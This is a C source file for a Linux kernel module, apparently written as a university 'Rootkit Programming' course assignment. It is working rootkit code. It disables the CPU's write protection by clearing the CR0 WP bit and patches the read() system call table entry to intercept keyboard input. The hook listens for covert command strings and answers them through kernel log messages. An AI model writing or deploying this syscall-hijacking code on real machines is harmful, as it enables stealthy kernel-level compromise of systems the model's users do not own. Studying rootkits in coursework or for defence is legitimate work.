
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 5                                                             */
/*                                                                             */
/*   Filename: module_masker.c                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_getdents */
#include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
#include <linux/ctype.h>

#include "module_masker.h"
#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */


MODULE_LICENSE("GPL");


/* Function that replaces the original read_syscall. In addition to what
   read_syscall does, it also ... */
asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
{
	long ret;

	/* Call original read_syscall */
	ret = read_syscall(fd, buf, count);

	/* If the read was not from STDIN don't do anything */
	if (fd != 0)
		return ret;

	if (match_command(buf, HEARTBEAT, &heartbeat_matched_so_far))
		printk(KERN_INFO "module_masker rootkit: %s\n", HEARTBEAT_RESPONSE);

	if (match_command(buf, VOILA, &voila_matched_so_far))
		printk(KERN_INFO "module_masker rootkit: %s\n", VOILA);

	return ret;
}


int match_command(char *buf, char *command, int *chars_matched_so_far)
{
	int i;

	/* Match the command */
	for (i=0 ; i<strlen(buf) && command[(*chars_matched_so_far)++] == buf[i++] ; )
		if (strlen(command) <= *chars_matched_so_far) {
			*chars_matched_so_far = 0;
			return 1;
		}

	if (i != strlen(buf) || command[*chars_matched_so_far-1] != buf[i-1])
		*chars_matched_so_far = 0;

	return 0;
}


/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the read() syscall. */
static int __init module_masker_start(void)
{
	disable_write_protect_mode();

	/* Store original read() syscall */
	sys_call_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	read_syscall = (void *) sys_call_table[__NR_read];

	/* Replace in the system call table the original
	   read() syscall with our intercepting function */
	sys_call_table[__NR_read] = (unsigned long *) my_read_syscall;

	/* Enable `write-protect` mode */
	enable_write_protect_mode();

	printk(KERN_INFO "module_masker rootkit: %s\n", "successfully inserted");

	/* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original getdents() syscall. */
static void __exit module_masker_end(void)
{
	disable_write_protect_mode();

	/* Restore original read() syscall */
	sys_call_table[__NR_read] = (unsigned long *) read_syscall;

	enable_write_protect_mode();

	printk(KERN_INFO "module_masker rootkit: %s\n", "successfully removed");

	return;
}


void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);
}


void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | CR0_WRITE_PROTECT_MASK);
}


module_init(module_masker_start);
module_exit(module_masker_end);
